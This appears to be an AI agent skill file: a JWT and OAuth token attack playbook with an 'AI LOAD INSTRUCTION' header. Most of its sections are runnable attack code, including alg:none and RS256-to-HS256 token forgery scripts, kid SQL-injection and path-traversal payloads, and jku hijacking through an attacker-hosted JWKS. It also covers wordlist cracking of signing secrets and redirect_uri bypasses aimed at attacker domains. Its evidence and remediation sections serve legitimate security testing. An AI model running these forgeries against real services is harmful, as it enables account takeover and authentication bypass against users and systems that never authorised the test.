---
name: jwt-oauth-token-attacks
description: >-
  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
---

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

---

## 14. EXECUTION PRIMITIVES

A token finding is proven by **a server accepting a token it should not have accepted**, and by the
data or action that acceptance unlocked. Every block below ends at that acceptance.

### 14.1 Decode, and check what the token actually asserts

```bash
T="https://target.tld"
dec() { python3 -c "
import base64,json,sys
p=sys.argv[1].split('.')
pad=lambda s:s+'='*(-len(s)%4)
for i,seg in enumerate(p[:2]):
    print('--- part',i)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad(seg))),indent=1))
" "$1"; }
dec "$TOKEN"
# and a full check of header, payload, and signature length
python3 -c "
import sys,base64,json
t=sys.argv[1]; p=t.split('.')
print('parts:',len(p),'sig bytes:',len(base64.urlsafe_b64decode(p[2]+'='*(-len(p[2])%4))) if len(p)>2 else 0)
print('header:',json.loads(base64.urlsafe_b64decode(p[0]+'='*(-len(p[0])%4))))
" "$TOKEN"
```

Read the **claims**, not just the algorithm: `sub`, `aud`, `iss`, `exp`, `nbf`, `scope`, and any
application-specific role claim. The finding is usually in what the claims assert versus what the
server enforces.

### 14.2 `alg:none` and algorithm confusion, properly controlled

```bash
# control: the original token works
curl -sS -o /tmp/c0 -w 'control   %{http_code} %{size_download}\n' "$T/api/me" -H "Authorization: Bearer $TOKEN"
# alg:none, with and without a trailing dot, and case variants
none_token() {
  H=$(printf '%s' "{\"alg\":\"none\",\"typ\":\"JWT\"}" | basenc --base64url | tr -d '=')
  P=$(printf '%s' "$1" | basenc --base64url | tr -d '=')
  echo "$H.$P."
}
for A in none None NONE nOnE; do
  H=$(printf '{"alg":"%s","typ":"JWT"}' "$A" | basenc --base64url | tr -d '=')
  P=$(printf '%s' '{"sub":"victim","role":"admin","exp":9999999999}' | basenc --base64url | tr -d '=')
  for SUF in "" "."; do
    R=$(curl -sS -o /tmp/n -w '%{http_code} %{size_download}' "$T/api/admin" -H "Authorization: Bearer $H.$P.$SUF")
    printf 'alg=%-5s suffix=%-2s %s\n' "$A" "${SUF:-none}" "$R"
  done
done
```

The **control is required**: a token with `alg:none` and no signature is only a finding if the server
accepts it. Compare the response to the control's - the same `401` means the library rejects it.

### 14.3 RS256 → HS256 confusion, with the public key as the secret

```bash
# obtain the public key (JWKS, a certificate, or a published PEM)
curl -sS "$T/.well-known/jwks.json" -o /tmp/jwks.json; head -c 200 /tmp/jwks.json; echo
python3 - <<'PY'
import json,base64
j=json.load(open('/tmp/jwks.json'))
for k in j.get('keys',[]):
    print(k.get('kty'), k.get('use'), k.get('kid'), k.get('n','')[:30])
PY
# build an HS256 token signed with the PEM public key bytes
python3 - <<'PY'
import json,base64,hmac,hashlib
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def sign(pem_path, payload):
    key=open(pem_path,'rb').read()
    h=b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
    p=b64(json.dumps(payload,separators=(',',':')).encode())
    s=b64(hmac.new(key,f"{h}.{p}".encode(),hashlib.sha256).digest())
    return f"{h}.{p}.{s}"
# try several key encodings, since the server's expected secret form varies
for form in ("-----BEGIN PUBLIC KEY-----\n","-----BEGIN RSA PUBLIC KEY-----\n"):
    print(form.strip(), "->", sign('/tmp/pub.pem',{"sub":"victim","role":"admin","exp":9999999999})[:40],"...")
PY
```

The **key form** matters: some vulnerable libraries compare against the PEM including the header and
footer, some against the DER body, and some against the raw modulus. Try each form against the
endpoint and compare with the control response.

### 14.4 `kid` injection

```bash
# path traversal in kid: point the key lookup at a file you control or a known one
for K in "../../../../dev/null" "../../../../etc/passwd" "key1" "' OR 1=1--" "../../../../proc/self/environ" ; do
  python3 - "$K" <<'PY' > /tmp/kidtok
import sys,json,base64,hmac,hashlib
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
k=sys.argv[1]
h=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":k},separators=(',',':')).encode())
p=b64(json.dumps({"sub":"victim","role":"admin","exp":9999999999},separators=(',',':')).encode())
# sign with an empty string, which is what /dev/null reads as
s=b64(hmac.new(b"",f"{h}.{p}".encode(),hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
PY
  R=$(curl -sS -o /tmp/k -w '%{http_code} %{size_download}' "$T/api/admin" -H "Authorization: Bearer $(cat /tmp/kidtok)")
  printf 'kid=%-30s %s\n' "$K" "$R"
done
```

A `kid` that reaches a filesystem path is the classic form: **if the lookup reads a file whose contents
you control or can predict (like `/dev/null`, which is empty), you can sign with that value.** Also test
`kid` values that select a key from a JWKS by untrusted index.

### 14.5 `jku` and `x5u` hijack

```bash
# point jku at a JWKS you host; the server must validate the URL before trusting it
cat > /tmp/jwks.json <<'J'
{"keys":[{"kty":"oct","kid":"attacker","use":"sig","alg":"HS256","k":"BASE64URL_OF_YOUR_SECRET"}]}
J
python3 -m http.server 80 &
python3 - <<'PY' > /tmp/jkutok
import json,base64,hmac,hashlib
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"attacker","jku":"http://COLLAB/jwks.json"},separators=(',',':')).encode())
p=b64(json.dumps({"sub":"victim","role":"admin","exp":9999999999},separators=(',',':')).encode())
s=b64(hmac.new(b"YOUR_SECRET",f"{h}.{p}".encode(),hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
PY
curl -sS -o /tmp/j -w 'jku-hijack %{http_code} %{size_download}\n' "$T/api/admin" \
  -H "Authorization: Bearer $(cat /tmp/jkutok)"
echo "and check whether the request to your JWKS arrived"
```

**The callback on your HTTP server is the proof** - it shows the server fetched a key from a URL you
chose. Combined with an accepted token, that is full authentication bypass.

### 14.6 Secret brute force and weak-key detection

```bash
# a short or common secret is recoverable offline
python3 - <<'PY'
import jwt   # pip install pyjwt
tok="PASTE_TOKEN"
words=[w.strip() for w in open('/usr/share/wordlists/rockyou.txt',errors='ignore')][:200000]
for w in words:
    try:
        jwt.decode(tok,w,algorithms=["HS256","HS384","HS512"])
        print("SECRET FOUND:",w); break
    except Exception: pass
else: print("not found in the list tried")
PY
# and a targeted list of the framework's defaults, which are the common cases
for S in secret password changeme jwttoken mysecret supersecret topsecret \
         'your-256-bit-secret' 'secretkey' 'test' 'dev' 'admin' 'jwt_secret' ; do
  python3 -c "
import jwt,sys
try: jwt.decode(open('/tmp/tok').read().strip(),'$S',algorithms=['HS256']); print('FOUND: $S')
except Exception: pass"
done
```

A recovered secret lets you **mint a token for any user**, which must then be accepted - present it and
show the response.

### 14.7 OAuth: `state`, `redirect_uri`, and the code flow

```bash
# 1) missing or unvalidated state
curl -sS -D- -o /dev/null "$T/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.tld/cb&scope=openid&state=xyz" | grep -iE '^location|^set-cookie|state'
curl -sS -D- -o /dev/null "$T/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.tld/cb&scope=openid" | grep -iE '^location'
# 2) redirect_uri validation: exact match, prefix match, subdomain, path traversal, and the open-redirect hop
for RU in "https://app.tld/cb" "https://app.tld.evil.tld/cb" "https://evil.tld/cb" \
          "https://app.tld/cb/../../evil" "https://app.tld@evil.tld/cb" \
          "https://app.tld/cb?next=https://evil.tld" "http://app.tld/cb"; do
  L=$(curl -sS -o /dev/null -w '%{redirect_url}' --get --data-urlencode "redirect_uri=$RU" \
        --data-urlencode "response_type=code" --data-urlencode "client_id=CLIENT" --data-urlencode "scope=openid" \
        "$T/oauth/authorize")
  printf '%-46s -> %s\n' "$RU" "${L:0:70}"
done
```

**A `code` delivered to an origin you control is the finding.** Run the flow to completion for the one
that works and capture the code landing in your redirect target - that is the end-to-end proof.

### 14.8 Implicit flow, PKCE downgrade, and scope escalation

```bash
# implicit: the token arrives in the fragment and leaks through Referer and scripts
curl -sS -D- -o /dev/null "$T/oauth/authorize?response_type=token&client_id=CLIENT&redirect_uri=https://app.tld/cb&scope=openid%20profile" | grep -iE '^location'
# PKCE downgrade: omit the challenge and see whether the server still issues a code
curl -sS -D- -o /dev/null "$T/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.tld/cb&scope=openid" | grep -iE '^location'
# scope escalation: request more scope than the client is registered for
for S in "openid" "openid%20profile%20email" "openid%20admin" "openid%20offline_access" "*"; do
  L=$(curl -sS -o /dev/null -w '%{redirect_url}' "$T/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://app.tld/cb&scope=$S")
  printf 'scope=%-32s -> %s\n' "$S" "${L:0:60}"
done
```

A server that **issues a code without PKCE for a public client** accepts a downgrade attack, and one
that grants an unregistered scope is an escalation. Both are visible in the redirect and the token
response.

### 14.9 Token leakage in the wild

```bash
# where tokens appear: URLs, Referer, logs, and client-side storage
grep -rniE 'access_token|id_token|refresh_token|bearer ' /tmp/bundles/ 2>/dev/null | head -10
curl -sS "$T/" | grep -oiE '(localStorage|sessionStorage)\.(get|set)Item\([^)]{0,40}\)' | sort -u | head
# the Referer leak: a page with the token in the URL loading a third-party resource
curl -sS -D- -o /dev/null "$T/cb#access_token=LEAKTEST" | grep -i 'referrer-policy'
echo "absent Referrer-Policy means the fragment/hash may leak through subresource requests in some clients"
```

**A token found in a URL, a bundle, or a log is the proof** - capture the artefact, and where it is a
live token, demonstrate only that it authenticates, then stop.

---

## 15. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the **original token work** (the control)? | your harness is correct |
| 2 | Does the **forged or modified token get accepted**? | the bypass |
| 3 | What did acceptance **unlock** - whose data, which action? | impact |
| 4 | Was the **signature verified at all**, or only the algorithm chosen by the client? | the class of the flaw |
| 5 | For OAuth: did a **code or token arrive at an origin you control**? | the end-to-end proof |
| 6 | For leakage: where did the token appear, and is it **live**? | the exposure, and its severity |
| 7 | Is it reproducible with a **freshly issued** token and a new session? | rules out a stale token quirk |

**Acceptance plus unlocked access is the bar.** A token that is malformed and rejected is not a
finding, and a token that is accepted but unlocks nothing you did not already have is a hardening note.

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **original token or flow** (the control) and its successful use | the baseline |
| The **forged token or altered flow**, byte for byte, with the construction method | reproducibility |
| The **acceptance response** and the **data or action it unlocked** | impact |
| The **decoded claims** of both tokens, side by side | shows exactly what changed |
| For a recovered secret: the **recovery method**, with the wordlist or the observation that produced it - never just the secret | the reader must be able to reproduce it |
| For `jku`/`x5u`: the **callback to your server** and the token that was accepted | proves the key was fetched from your URL |
| For OAuth: the **full redirect chain**, ending at the origin you control, with the code or token | the end-to-end proof |
| **Negative control** - the same forged token with an obviously invalid signature is rejected | shows signature verification exists and your token is special |
| The **library and version** where identifiable, since several of these depend on a known implementation | context for the fix |
| A statement that no **live user's session was hijacked** beyond the proof, and no data was modified | scope discipline |

Report the **forged token and the acceptance**: "`POST /api/admin` with the original user token returns
`403`; the same request with a token whose header is `{"alg":"none"}` and whose payload sets
`role:"admin"` returns `200` and the administrative user list; the server's `WWW-Authenticate` header
identifies the library, and a control token with a deliberately corrupted signature is rejected, so a
signature check exists and only the `alg` selection is broken", never "the JWT implementation is
vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A forged token that the server **rejects** | the control works |
| A decoded token showing `alg:none` that is never accepted | not exploitable |
| A token that is accepted but returns only your own data | no boundary crossed |
| A secret recovered offline that no live token ever accepts | check acceptance before reporting |
| A `jku` value the server normalises to its own JWKS | the validation works |
| An OAuth redirect that stays on the legitimate origin | no delivery to an attacker |
| A `state` parameter present but unused, with no CSRF consequence demonstrated | report the missing binding precisely |
| A token found in a bundle but already revoked or expired | check validity |
| A `kid` traversal that produces a signature error | the lookup failed safely |
| An `alg` confusion attempt where the server pins the algorithm | the control works |
| A token leaked in a log you cannot access as an attacker | not an exposure |
| A finding demonstrated against a token you minted yourself with a secret you own | tests your own setup |

**Control, forge, accept, unlock.** Any claim that stops before "accept" is unproven, and most false
positives in this domain stop there.

---

## 17. REMEDIATION REFERENCE

1. **Pin the accepted algorithms server-side and never read `alg` from the token** - algorithm confusion and `alg:none` both disappear when the verifier chooses the algorithm rather than the token.
2. **Verify the signature with the correct key type, and reject tokens whose `alg` does not match the expected family** - an HMAC verifier must never be handed an RSA public key.
3. **Reject `none` explicitly, in the library and in a test** - several libraries have accepted it historically, so an explicit rejection plus a regression test is warranted.
4. **Validate `jku` and `x5u` against an allowlist of trusted origins, and prefer a fixed JWKS URL** - a fetch of a key from a client-supplied URL is a full authentication bypass.
5. **Treat `kid` as an opaque identifier, not a path or a query fragment** - resolve it against a known key set, never against the filesystem or a database query built by concatenation.
6. **Use a long, random secret and rotate it** - a weak HMAC secret is brute-forceable offline, which makes every other control irrelevant.
7. **Verify `iss`, `aud`, `exp`, and `nbf` on every request** - an accepted token with the wrong audience is a token from another service being reused against yours.
8. **Bind the authorization code to the client with PKCE and require it for public clients** - it defeats code interception and the implicit-flow leakage that follows from it.
9. **Validate `redirect_uri` by exact match against the registered value** - prefix and subdomain matching are the recurring bugs, and the comparison should be on the full string.
10. **Require and verify the `state` parameter, binding it to the user's session** - it is the CSRF defence for the authorization flow, and its absence is a finding in its own right.
11. **Keep tokens out of URLs, logs, and client-side storage where possible, and set a restrictive `Referrer-Policy`** - tokens in a URL leak through Referer headers, browser history, and proxy logs.

---

## 18. RELATED SIBLINGS - LOAD TOGETHER

- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - the broader API authentication abuse family
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - the provider-side configuration findings
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the authentication-bypass companion
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the neighbouring assertion-signing class
- [attack-jwt](../attack-jwt/SKILL.md) - the automated JWT testing playbook
